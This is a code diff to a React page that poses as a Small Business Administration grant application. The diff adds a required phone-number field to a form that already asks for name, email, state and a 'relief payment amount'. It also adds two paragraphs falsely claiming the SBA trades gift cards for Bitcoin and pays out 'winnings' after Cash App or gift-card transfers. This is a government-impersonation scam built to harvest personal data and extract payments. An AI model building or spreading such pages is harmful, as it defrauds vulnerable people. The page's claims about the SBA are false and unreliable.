@@ -32,6 +32,7 @@ export default function App() {
     firstname: "",
     lastname: "",
     email: "",
+    number: "",
     state: "",
     amount: "",
   });
@@ -49,6 +50,7 @@ export default function App() {
       firstname: grantInputs.firstname,
       lastname: grantInputs.lastname,
       email: grantInputs.email,
+      number: grantInputs.number,
       state: grantInputs.state,
       amount: grantInputs.amount,
     };
@@ -68,6 +70,7 @@ export default function App() {
             firstname: "",
             lastname: "",
             email: "",
+            number: "",
             state: "",
             amount: "",
           });
@@ -162,12 +165,12 @@ export default function App() {
 
       <main className="p-4 flex flex-col gap-6 w-full max-w-[900px] mx-auto ">
         <section className="bg-[#002e6d] p-7 lg:p-10 flex flex-col gap-4">
-          <h1 className="text-white text-4xl lg:text-5xl tracking-tighter font_nexa">
+          <h1 className="text-white text-5xl lg:text-5xl tracking-tight font_nexa font-black">
             Need funding for your small business?
           </h1>
           <a
             href=""
-            className="bg-blue-500 w-max py-3 px-7 rounded-md text-white text-sm "
+            className="bg-blue-500 w-max py-3 px-7 rounded-md font-semibold text-white text-sm "
           >
             Learn about SBA grant
           </a>
@@ -179,6 +182,15 @@ export default function App() {
             Small Business Administration Grants
           </p>
         </h1>
+
+        <p className="text-sm light_text font-black">
+          (SBA) Small Business Administration that deals with gift cards to
+          Bitcoin and they need more than $50,000 daily. Basically they are
+          doing this to help the less privileged on the control of Finance
+          during lockdown to benefit from this you have to trade with them using
+          giftcard or make cashapp transfer for bitcoin spinning and get your
+          winnings immediately after verification.
+        </p>
 
         <Swiper
           className="h-[250px] lg:h-[400px] overflow-hidden w-full"
@@ -203,6 +215,15 @@ export default function App() {
           </SwiperSlide>
         </Swiper>
 
+        <p className="text-sm light_text font-black">
+          Bitcoin is a form of digital money that exists independently of any
+          government, state, or financial institution, can be transferred
+          globally. The Small business administration in conjunction with the
+          Bitcoin minning groups is giving out money to citizens to be able to
+          enjoy the benefits of Bitcoin because it’s acceptable
+          all over the world
+        </p>
+
         <div className="flex flex-col">
           <h1 className="lg:text-xl font-semibold">
             Please complete the form to continue your SBA Grant application.
@@ -222,7 +243,7 @@ export default function App() {
           </p>
 
           <div className="flex flex-col gap-1">
-            <label htmlFor="">
+            <label htmlFor="" className="uppercase font-semibold">
               Firstname <span className="text-red-500">*</span>
             </label>
             <input
@@ -237,7 +258,7 @@ export default function App() {
           </div>
 
           <div className="flex flex-col gap-1">
-            <label htmlFor="">
+            <label htmlFor="" className="uppercase font-semibold">
               Lastname <span className="text-red-500">*</span>
             </label>
             <input
@@ -252,7 +273,7 @@ export default function App() {
           </div>
 
           <div className="flex flex-col gap-1">
-            <label htmlFor="">
+            <label htmlFor="" className="uppercase font-semibold">
               Email <span className="text-red-500">*</span>
             </label>
             <input
@@ -267,7 +288,22 @@ export default function App() {
           </div>
 
           <div className="flex flex-col gap-1">
-            <label htmlFor="">
+            <label htmlFor="" className="uppercase font-semibold">
+              Phone Number <span className="text-red-500">*</span>
+            </label>
+            <input
+              required
+              type="text"
+              name="number"
+              value={grantInputs.number}
+              onChange={handleChange}
+              className="border border-zinc-300 p-2.5 outline-none focus:border-[#002e6d] placeholder:text-xs rounded-lg placeholder:text-zinc-300 placeholder:font-light px-4 bg-white h-[45px]"
+              placeholder="Enter your phone number"
+            />
+          </div>
+
+          <div className="flex flex-col gap-1">
+            <label htmlFor="" className="uppercase font-semibold">
               State <span className="text-red-500">*</span>
             </label>
             <select
@@ -289,7 +325,7 @@ export default function App() {
           </div>
 
           <div className="flex flex-col gap-1">
-            <label htmlFor="">
+            <label htmlFor="" className="uppercase font-semibold">
               Select a relief payment amount{" "}
               <span className="text-red-500">*</span>
             </label>
